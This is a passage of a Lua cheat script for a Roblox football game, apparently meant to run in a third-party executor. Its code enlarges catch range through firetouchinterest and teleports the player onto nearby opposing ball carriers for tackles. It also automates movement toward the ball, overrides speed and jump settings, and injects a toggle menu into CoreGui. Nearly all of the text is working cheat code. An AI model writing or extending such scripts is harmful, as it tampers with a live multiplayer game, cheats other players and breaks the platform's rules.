                vim:SendKeyEvent(false, Enum.KeyCode.R, false, game)
            end
        end
    end
end)

local lastHadFootball = false

task.spawn(function()
    while true do
        task.wait(0.1)

        if resetAfterCatchEnabled then
            local char = Player.Character
            if char and char:FindFirstChild("Football") and not lastHadFootball then
                lastHadFootball = true
                task.wait(resetAfterCatchDelay)

                if char:FindFirstChild("Humanoid") then
                    char.Humanoid.Health = 0
                end
            elseif char and not char:FindFirstChild("Football") then
                lastHadFootball = false
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait()

        if autoQBEnabled then
            local char = Player.Character
            if not char or not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChild("Humanoid") then continue end

            local closest, closestDist = nil, math.huge
            for _, v in workspace:GetChildren() do
                if v.Name == "Football" and v:IsA("BasePart") then
                    local dist = (char.HumanoidRootPart.Position - v.Position).Magnitude
                    if dist <= 50 and dist < closestDist then
                        closest = v
                        closestDist = dist
                    end
                end
            end

            if closest then
                char.Humanoid:MoveTo(closest.Position)
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(0.1)

        if not tackleReachEnabled then continue end

        local player = game:GetService("Players").LocalPlayer
        local character = player.Character
        local hrp = character and character:FindFirstChild("HumanoidRootPart")
        if not hrp then continue end

        local closest, closestDist = nil, math.huge

        for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
            if plr ~= player and plr.Team ~= player.Team then  -- âœ… skip teammates
                if plr.Character and plr.Character:FindFirstChild("Football") then
                    local targetHRP = plr.Character:FindFirstChild("HumanoidRootPart")
                    if targetHRP then
                        local dist = (hrp.Position - targetHRP.Position).Magnitude
                        if dist < closestDist then
                            closestDist = dist
                            closest = targetHRP
                        end
                    end
                end
            end
        end

        if closest and closestDist <= 5 then
            local originalPos = hrp.CFrame
            for _ = 1, 5 do
                hrp.CFrame = closest.CFrame
                task.wait(0.01)
                hrp.CFrame = originalPos
                task.wait(0.01)
            end
        end
    end
end)

-- // Magnet loop
task.spawn(function()
    while true do
        task.wait()

        if not Magnets then continue end
        if not Character or not Character:FindFirstChild("CatchRight") or not Character:FindFirstChild("CatchLeft") then continue end

        for _, v in workspace:GetChildren() do
            if v.Name == "Football" and v:IsA("BasePart") and not v.Anchored and v.Parent == workspace then
                -- Add sphere if missing
                local sphere = v:FindFirstChild("RangeSphere")
                if not sphere then
                    sphere = Instance.new("Part")
                    sphere.Name = "RangeSphere"
                    sphere.Shape = Enum.PartType.Ball
                    sphere.Size = Vector3.new(Range, Range, Range)
                    sphere.Color = HitboxColor
                    sphere.Transparency = ShowHitbox and HitboxTransparency or 1
                    sphere.CanCollide = false
                    sphere.Anchored = true
                    sphere.Material = Enum.Material.Neon
                    sphere.Position = v.Position
                    sphere.Parent = v

                    task.spawn(function()
                        while sphere.Parent == v and v.Parent == workspace do
                            task.wait()
                            sphere.CFrame = v.CFrame
                        end
                    end)
                end

                -- Distance check
                local distRight = (Character["CatchRight"].Position - sphere.Position).magnitude
                local distLeft = (Character["CatchLeft"].Position - sphere.Position).magnitude

                if distRight <= Range or distLeft <= Range then
                    task.spawn(function()
                        if UseMagnetDelay then
                            task.wait(MagnetDelay)
                        end
                        firetouchinterest(Character["CatchRight"], v, 0)
                        firetouchinterest(Character["CatchLeft"], v, 0)
                        firetouchinterest(Character["CatchRight"], v, 1)
                        firetouchinterest(Character["CatchLeft"], v, 1)
                    end)
                end
            end
        end
    end
end)

workspace.ChildRemoved:Connect(function(child)
    if child.Name == "Football" and child:IsA("BasePart") then
        local sphere = child:FindFirstChild("RangeSphere")
        if sphere then
            sphere:Destroy()
        end
    end
end)



game:GetService("RunService").Heartbeat:Connect(function()
    if walkSpeedEnabled or jumpPowerEnabled or noMoveRestrictions then
        applySettings()
    end
end)

function handleGraphics(char, low)
    if not char then return end

    for _, part in ipairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            if low then
                -- Store original material if not already stored
                if not originalMaterials[part] then
                    originalMaterials[part] = part.Material
                end
                part.Material = Enum.Material.SmoothPlastic
            else
                -- Revert to original material if it was stored
                if originalMaterials[part] then
                    part.Material = originalMaterials[part]
                end
            end
        end
    end

    -- If turning off, clear the material cache
    if not low then
        originalMaterials = {}
    end
end

game:GetService("RunService").Heartbeat:Connect(function()
    if walkSpeedEnabled or jumpPowerEnabled or noMoveRestrictions then
        applySettings()
    end
end)

local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

-- Function to apply the drag system
local function applyDragSystem()
	wait(1) -- Delay so everything is loaded

	for _, gui in pairs(CoreGui:GetChildren()) do
		if gui:IsA("ScreenGui") and gui.Name == "name" then
			local MainLib = gui:FindFirstChild("MainLib")
			if MainLib then
				local dragging = false
				local dragStart, startPos

				local function update(input)
					local delta = input.Position - dragStart
					MainLib.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
				end

				MainLib.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						dragging = true
						dragStart = input.Position
						startPos = MainLib.Position

						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								dragging = false
							end
						end)
					end
				end)

				UserInputService.InputChanged:Connect(function(input)
					if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
						update(input)
					end
				end)
			end
		end
	end
end

applyDragSystem()

SettingsTab:CreateLabel("Settings")

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

-- Set your main UI name here:
local mainUi = CoreGui:FindFirstChild("name")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MobileToggleUI"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = CoreGui

-- Create TextButton
local button = Instance.new("TextButton")
button.Name = "ToggleUIButton"
button.Size = UDim2.new(0.12, 0, 0.05, 0)
button.Position = UDim2.new(0.44, 0, 0.02, 0)
button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Font = Enum.Font.GothamMedium -- closest to Montserrat in Roblox
button.TextScaled = true
button.Text = "Open"
button.Parent = screenGui

-- Make it draggable
button.Active = true
button.Draggable = true

-- Add rounded corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 6)
corner.Parent = button

-- Update button text depending on UI visibility
local function updateButtonText()
	if mainUi and mainUi.Enabled then
		button.Text = "Close"
	else
		button.Text = "Open"
	end
end

-- Button logic
button.MouseButton1Click:Connect(function()
	if mainUi then
		mainUi.Enabled = not mainUi.Enabled
		updateButtonText()
	end
end)

-- Constantly check state
task.spawn(function()
	while true do
		updateButtonText()
		task.wait(0.5)
	end
end)
